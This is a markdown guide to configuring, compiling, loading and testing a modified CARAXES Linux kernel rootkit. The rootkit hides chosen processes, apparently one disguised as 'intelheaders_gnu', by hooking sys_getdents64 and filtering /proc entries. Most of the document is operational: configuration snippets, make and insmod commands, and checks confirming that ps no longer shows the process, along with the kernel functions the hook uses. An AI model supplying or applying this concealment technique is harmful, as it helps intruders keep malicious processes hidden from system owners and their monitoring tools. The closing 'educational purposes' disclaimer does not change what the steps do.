# Process Hiding Guide for CARAXES Rootkit

This guide explains how to use the modified CARAXES rootkit to hide processes by their executable path or command line arguments.

## Configuration

The process hiding functionality is configured in `rootkit.h` with these variables:

```c
// Process hiding by executable path or command line
char* HIDE_PROCESS_EXE = "/usr/bin/intelheaders_gnu";
char* HIDE_PROCESS_CMDLINE = "intelheaders_gnu -i -o";
```

## How It Works

The rootkit intercepts the `sys_getdents64` syscall and checks each process directory in `/proc/` against the hiding criteria:

1. **Executable Path Matching**: Checks if the process executable path contains the string specified in `HIDE_PROCESS_EXE`
2. **Command Line Matching**: Checks if the process command line contains the string specified in `HIDE_PROCESS_CMDLINE`

## Usage Examples

### Example 1: Hide by Executable Path

To hide all processes running `/usr/bin/intelheaders_gnu`:

```c
char* HIDE_PROCESS_EXE = "/usr/bin/intelheaders_gnu";
char* HIDE_PROCESS_CMDLINE = NULL; // Disable cmdline matching
```

### Example 2: Hide by Command Line Arguments

To hide processes with specific arguments like "intelheaders_gnu -i -o":

```c
char* HIDE_PROCESS_EXE = NULL; // Disable exe path matching
char* HIDE_PROCESS_CMDLINE = "intelheaders_gnu -i -o";
```

### Example 3: Hide by Both (OR condition)

To hide processes that match either the executable path OR command line:

```c
char* HIDE_PROCESS_EXE = "/usr/bin/intelheaders_gnu";
char* HIDE_PROCESS_CMDLINE = "intelheaders_gnu -i -o";
```

## Compilation and Installation

1. Modify the configuration in `rootkit.h`
2. Compile the rootkit:
   ```bash
   make clean
   make
   ```
3. Load the rootkit:
   ```bash
   sudo insmod caraxes.ko
   ```

## Testing

1. Start your target process:
   ```bash
   /usr/bin/intelheaders_gnu -i -o some_arguments &
   ```

2. Check if it's visible before loading the rootkit:
   ```bash
   ps aux | grep intelheaders_gnu
   ls /proc/ | grep -E '^[0-9]+$' | xargs -I {} sh -c 'cat /proc/{}/cmdline 2>/dev/null | grep -l intelheaders_gnu'
   ```

3. Load the rootkit:
   ```bash
   sudo insmod caraxes.ko
   ```

4. Verify the process is now hidden:
   ```bash
   ps aux | grep intelheaders_gnu  # Should show no results
   ls /proc/ | grep -E '^[0-9]+$' | xargs -I {} sh -c 'cat /proc/{}/cmdline 2>/dev/null | grep -l intelheaders_gnu'  # Should show no results
   ```

5. Remove the rootkit to make processes visible again:
   ```bash
   sudo rmmod caraxes
   ```

## Technical Details

The process hiding works by:

1. **Hooking `sys_getdents64`**: Intercepts directory listing calls
2. **PID Detection**: Identifies numeric directory names in `/proc/` as potential process IDs
3. **Process Lookup**: Uses `pid_task(find_vpid(pid), PIDTYPE_PID)` to find the task structure
4. **Executable Path Check**: Reads the executable path using `d_path(&exe_file->f_path, ...)`
5. **Command Line Check**: Reads command line arguments from process memory using `access_process_vm()`
6. **Directory Entry Removal**: Removes matching process directories from the listing

## Limitations

- Only hides processes from directory listings (`ls /proc/`, `ps`, etc.)
- Does not hide from direct access (e.g., `cat /proc/1234/cmdline` still works if you know the PID)
- Performance impact when listing `/proc/` due to process inspection
- May not work with all kernel versions due to internal API changes

## Security Considerations

- This is for educational and research purposes only
- Use responsibly and only on systems you own or have permission to test
- The rootkit can be detected by advanced security tools
- Always have a way to remove the rootkit (avoid using `hide_module()` during testing)
